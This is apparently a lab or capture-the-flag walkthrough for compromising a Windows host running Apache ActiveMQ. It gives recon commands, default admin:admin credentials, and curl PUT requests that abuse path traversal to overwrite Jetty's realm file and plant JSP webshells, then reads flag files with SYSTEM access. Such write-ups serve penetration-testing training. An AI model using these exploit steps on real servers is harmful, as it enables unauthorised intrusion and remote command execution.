* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

## Recon-Enumeration  
nmap -A -p- 10.2.0.15  
![alt text](./img/active01.PNG?raw=true)  
![alt text](./img/active02.PNG?raw=true)  
![alt text](./img/active03.PNG?raw=true)  

enum4linux 10.2.0.15  
![alt text](./img/active04.PNG?raw=true)  
![alt text](./img/active05.PNG?raw=true)  

dirsearch -u http://10.2.0.15:8161/ -w ~/wordlists/big.txt -t 100 -e php,html,aspx,txt,xml -f --full-url  
![alt text](./img/active09.PNG?raw=true)  
![alt text](./img/active06.PNG?raw=true)   

Let’s start Burpsuite and try to login with admin:admin  
![alt text](./img/active07.PNG?raw=true)  

The highlight section looks encoded. Let’s discover with [CyberChef](https://gchq.github.io/CyberChef/)  
![alt text](./img/active08.PNG?raw=true)  

So the credentials are send encoded with base64

In nmap we can see the versions of the applications  
![alt text](./img/active10.PNG?raw=true)  

## Exploit  
Let’s try to find exploit to them…  
![alt text](./img/active11.PNG?raw=true)  
![alt text](./img/active12.PNG?raw=true)  

We don’t find to this version of Jetty, however to ActiveMQ we have some. Let’s read the 40857.txt

searchsploit -x windows/remote/40857.txt  
![alt text](./img/active13.PNG?raw=true)  
![alt text](./img/active14.PNG?raw=true)  
  
We can just follow the steps:  
Run the command: echo admin: admin, admin > jetty-realm.properties  
Run the command: touch cmd.jsp  
Put he above lines in the cmd.jsp file:  
PS: Is the same on the exploit description  
![alt text](./img/active26.PNG?raw=true)  

Run the commands:  
curl -v -X PUT --data "@jetty-realm.properties" http://10.2.0.15:8161/fileserver/..\\..\\conf\\jetty-realm.properties  
Restart the target machine  
curl -u 'admin:admin' -v -X PUT --data "@cmd.jsp" http://10.2.0.15:8161/fileserver/..\\admin\\cmd.jsp  
Access the page http://10.2.0.15:8161/admin/cmd.jsp  
Use the credentials admin:admin  
Ready, now we have an webshell  
![alt text](./img/active15.PNG?raw=true)  

## Privesc

The dir command doesn’t work. But running whoami we discover we are system:  
![alt text](./img/active16.PNG?raw=true)  

We already have system, however the dir command doesn’t work. So let’s try to get a shell or more information…  
![alt text](./img/active17.PNG?raw=true)  
![alt text](./img/active18.PNG?raw=true)  

Ok, i had some problems to run some commands. So i uploaded another .jsp webshell with the above code:  
PS: On kali is the same code of the file /usr/share/webshells/jsp/cmdjsp.jsp  
![alt text](./img/active25.PNG?raw=true)  

Run the command:  
curl -u 'admin:admin' -v -X PUT --data "@cmdjsp.jsp" http://10.2.0.15:8161/fileserver/..\\admin\\cmdjsp.jsp  

Now we have 2 webshells that complement each other  
![alt text](./img/active20.PNG?raw=true)  

cd c:\ & dir *.txt /s /p > c:\windows\temp\aaa.txt & type c:\windows\temp\aaa.txt  
![alt text](./img/active21.PNG?raw=true)  
  
![alt text](./img/active22.PNG?raw=true)  
  
type c:\Users\public\user.txt  
![alt text](./img/active23.PNG?raw=true)  

type c:\Users\Administrador.WIN-439TMFLJJ23\root.txt.txt  
![alt text](./img/active24.PNG?raw=true)  
